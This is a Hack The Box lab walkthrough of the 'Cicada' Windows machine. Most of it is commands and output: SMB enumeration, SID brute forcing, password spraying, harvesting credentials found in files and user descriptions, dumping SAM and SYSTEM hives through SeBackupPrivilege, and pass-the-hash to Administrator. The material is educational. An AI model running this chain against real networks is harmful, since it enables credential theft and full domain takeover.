---
title: "Cicada Walkthrough - HTB Easy | Active Directory Enumeration & SeBackupPrivilege Exploitation"
description: "Complete walkthrough of Cicada from Hack The Box. Covers Active Directory enumeration for beginners, enumerating shares, discovering cleartext passwords in files, password spraying attacks, and exploiting SeBackupPrivilege to achieve full system compromise."
author: dua2z3rr
date: 2025-10-10 1:00:00
categories: ["HackTheBox", "Machines"]
tags: ["enterprise-network", "vulnerability-assessment", "active-directory", "protocols", "common-services", "security-tools", "authentication", "hardcoded-credentials", "powershell", "smb", "winrm", "windows", "reconnaissance", "pass-the-hash", "password-spraying", "privilege-abuse"]
image: /assets/img/cicada/cicada-resized.png
---

## Overview

Cicada is an easy-difficult Windows machine that focuses on beginner Active Directory enumeration and exploitation. In this machine, players will enumerate the domain, identify users, navigate shares, uncover plaintext passwords stored in files, execute a password spray, and use the `SeBackupPrivilege` to achieve full system compromise.

---

## External Enumeration

### Nmap

Let's start with the usual nmap scans:

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $sudo nmap 10.10.11.35 -vv -p-
<SNIP>
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
51208/tcp open  unknown          syn-ack ttl 127

<SNIP>

┌─[dua2z3rr@parrot]─[~]
└──╼ $sudo nmap 10.10.11.35 -vv -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,51208 -sC -sV
<SNIP>
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-10-10 15:18:53Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-10T15:20:25+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
<SNIP>
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
<SNIP>
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
<SNIP>
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
<SNIP>
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
51208/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-10-10T15:19:45
|_  start_date: N/A
```

**Key findings:**
- We're in an Active Directory environment
- Domain: **cicada.htb**
- Domain Controller: **CICADA-DC**
- Standard AD ports open (DNS, Kerberos, LDAP, SMB, WinRM)

---

## SMB Enumeration

Let's begin by enumerating port 445, or **SMB**.

```shell
┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $crackmapexec smb 10.10.11.35 --shares -u 'guest' -p ''
SMB         10.10.11.35     445    CICADA-DC        [*] Windows 10.0 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\guest: 
SMB         10.10.11.35     445    CICADA-DC        [+] Enumerated shares
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
SMB         10.10.11.35     445    CICADA-DC        DEV                             
SMB         10.10.11.35     445    CICADA-DC        HR              READ            
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.35     445    CICADA-DC        NETLOGON                        Logon server share 
SMB         10.10.11.35     445    CICADA-DC        SYSVOL                          Logon server share 
```

**Important discovery:** We can access the **HR** share with guest credentials.

### Accessing the HR Share

```shell
┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $smbclient //10.10.11.35/HR -U guest
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Mar 14 13:29:09 2024
  ..                                  D        0  Thu Mar 14 13:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 19:31:48 2024

		4168447 blocks of size 4096. 478178 blocks available
smb: \> get "Notice from HR.txt" 
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (3,4 KiloBytes/sec) (average 3,4 KiloBytes/sec)
```

We successfully accessed the SMB share. Let's examine the file contents.

### Reading the File

Reading the file locally:

```text
Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

**Default password discovered:** `Cicada$M6Corpb*@Lp#nZp!8`

---

## Active Directory User Enumeration

Let's enumerate AD users to perform a password spraying attack. We can use the impacket script **lookupsid**. This tool will brute force **Windows Security Identifiers**.

```shell
┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $sudo python3 /usr/share/doc/python3-impacket/examples/lookupsid.py 'cicada.htb/guest'@cicada.htb -no-pass -target-ip 10.10.11.35 -port 445
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Brute forcing SIDs at cicada.htb
[*] StringBinding ncacn_np:cicada.htb[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-917908876-1423158569-3159038727
498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: CICADA\Administrator (SidTypeUser)
501: CICADA\Guest (SidTypeUser)
502: CICADA\krbtgt (SidTypeUser)
512: CICADA\Domain Admins (SidTypeGroup)
513: CICADA\Domain Users (SidTypeGroup)
514: CICADA\Domain Guests (SidTypeGroup)
515: CICADA\Domain Computers (SidTypeGroup)
516: CICADA\Domain Controllers (SidTypeGroup)
517: CICADA\Cert Publishers (SidTypeAlias)
518: CICADA\Schema Admins (SidTypeGroup)
519: CICADA\Enterprise Admins (SidTypeGroup)
520: CICADA\Group Policy Creator Owners (SidTypeGroup)
521: CICADA\Read-only Domain Controllers (SidTypeGroup)
522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
525: CICADA\Protected Users (SidTypeGroup)
526: CICADA\Key Admins (SidTypeGroup)
527: CICADA\Enterprise Key Admins (SidTypeGroup)
553: CICADA\RAS and IAS Servers (SidTypeAlias)
571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
1000: CICADA\CICADA-DC$ (SidTypeUser)
1101: CICADA\DnsAdmins (SidTypeAlias)
1102: CICADA\DnsUpdateProxy (SidTypeGroup)
1103: CICADA\Groups (SidTypeGroup)
1104: CICADA\john.smoulder (SidTypeUser)
1105: CICADA\sarah.dantelia (SidTypeUser)
1106: CICADA\michael.wrightson (SidTypeUser)
1108: CICADA\david.orelious (SidTypeUser)
1109: CICADA\Dev Support (SidTypeGroup)
1601: CICADA\emily.oscars (SidTypeUser)
```

Let's create a custom wordlist for password spraying:

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $sudo python3 /usr/share/doc/python3-impacket/examples/lookupsid.py 'cicada.htb/guest'@cicada.htb -no-pass -target-ip 10.10.11.35 -port 445 | grep 'SidTypeUser' | sed 's/.*\\\(.*\) (SidTypeUser)/\1/' > users.txt
┌─[dua2z3rr@parrot]─[~]
└──╼ $cat users.txt
Administrator
Guest
krbtgt
CICADA-DC$
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
```

---

## Password Spraying

For password spraying, I prefer using **netexec** (formerly crackmapexec). Let's proceed with the attack.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $nxc smb 10.10.11.35 -u "/home/dua2z3rr/users.txt" -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
```

**Valid credentials found:**
- **Username:** `michael.wrightson`
- **Password:** `Cicada$M6Corpb*@Lp#nZp!8`

Let's re-enumerate with the correct credentials to obtain information like metadata.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $nxc smb 10.10.11.35 -u "michael.wrightson" -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.10.11.35     445    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.10.11.35     445    CICADA-DC        Administrator                 2024-08-26 20:08:03 1       Built-in account for administering the computer/domain 
SMB         10.10.11.35     445    CICADA-DC        Guest                         2024-08-28 17:26:56 1       Built-in account for guest access to the computer/domain 
SMB         10.10.11.35     445    CICADA-DC        krbtgt                        2024-03-14 11:14:10 1       Key Distribution Center Service Account 
SMB         10.10.11.35     445    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 1        
SMB         10.10.11.35     445    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 1        
SMB         10.10.11.35     445    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 0        
SMB         10.10.11.35     445    CICADA-DC        david.orelious                2024-03-14 12:17:29 1       Just in case I forget my password is aRt$Lp#7t*VQ!3 
SMB         10.10.11.35     445    CICADA-DC        emily.oscars                  2024-08-22 21:20:17 1        
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated 8 local users: CICADA
```

**Another password discovered:** `david.orelious`'s password in the description field: `aRt$Lp#7t*VQ!3`

---

## SMB Enumeration with New Credentials

Let's enumerate the shares we can now access:

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $smbclient -U david.orelious //10.10.11.35/DEV
Password for [WORKGROUP\david.orelious]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Mar 14 13:31:39 2024
  ..                                  D        0  Thu Mar 14 13:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 19:28:22 2024

		4168447 blocks of size 4096. 478178 blocks available
smb: \> get Backup_script.ps1 
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (1,4 KiloBytes/sec) (average 1,4 KiloBytes/sec)
```

Let's analyze this script:

```powershell
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

**Third set of credentials found:**
- **Username:** `emily.oscars`
- **Password:** `Q!3@Lp#M6b*7t*Vt`

---

## Initial Access

Since this is a Windows host, we won't use SSH but **evil-winrm** instead:

```shell
┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $evil-winrm -p 'Q!3@Lp#M6b*7t*Vt' -u emily.oscars -i 10.10.11.35
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents>
```

**User flag obtained** from `C:\Users\emily.oscars.CICADA\Desktop\user.txt`

---

## Shell as emily.oscars

### Internal Enumeration

```shell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

**Critical finding:** We have the dangerous **SeBackupPrivilege**. With this privilege, we can perform a complete privilege escalation.

Let's copy the SAM and SYSTEM registry hives:

```powershell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> reg save hklm\sam sam
The operation completed successfully.

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> reg save hklm\system system
The operation completed successfully.

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> dir


    Directory: C:\Users\emily.oscars.CICADA


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---         8/28/2024  10:32 AM                Desktop
d-r---         8/22/2024   2:22 PM                Documents
d-r---          5/8/2021   1:20 AM                Downloads
d-r---          5/8/2021   1:20 AM                Favorites
d-r---          5/8/2021   1:20 AM                Links
d-r---          5/8/2021   1:20 AM                Music
d-r---          5/8/2021   1:20 AM                Pictures
d-----          5/8/2021   1:20 AM                Saved Games
d-r---          5/8/2021   1:20 AM                Videos
-a----        10/10/2025  10:32 AM          49152 sam
-a----        10/10/2025  10:32 AM       18518016 system
```

Let's transfer them locally using evil-winrm's built-in **download** command.

> We're not required to crack the hash—**evil-winrm** allows us to log in using **Pass the Hash (PtH)**.
{: .prompt-tip }

```powershell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> download sam
                                        
Info: Downloading C:\Users\emily.oscars.CICADA\sam to sam
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA>download system
                                        
Info: Downloading C:\Users\emily.oscars.CICADA\system to system
                                        
Info: Download successful!
```

---

## Privilege Escalation via Pass the Hash

Now let's extract the hash and log in as Administrator.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $impacket-secretsdump -sam sam -system system local
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up...

┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $evil-winrm -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i 10.10.11.35
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
cicada\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        10/10/2025   8:07 AM             34 root.txt
```

**Root flag obtained!** Box completed.

---

## Reflections

### What Surprised Me

What caught me off guard was how easily accessible sensitive information was in this environment. Finding plaintext passwords in HR share files and user account descriptions demonstrates a critical security oversight.

### Main Mistake

My biggest mistake was initially overlooking the importance of metadata enumeration. I spent time trying different attack vectors before properly enumerating user descriptions with crackmapexec. In retrospect, thoroughly enumerating all available information with valid credentials should always be a priority step.

### Alternative Approaches

Instead of using evil-winrm for the Pass the Hash attack, I could have used impacket-psexec or impacket-wmiexec to gain a shell as Administrator.

### Open Question

What additional hardening measures could prevent SeBackupPrivilege abuse while still allowing legitimate backup operations?

---

**Completed this box? What was your approach to enumerating the AD environment?** Leave a comment down below!
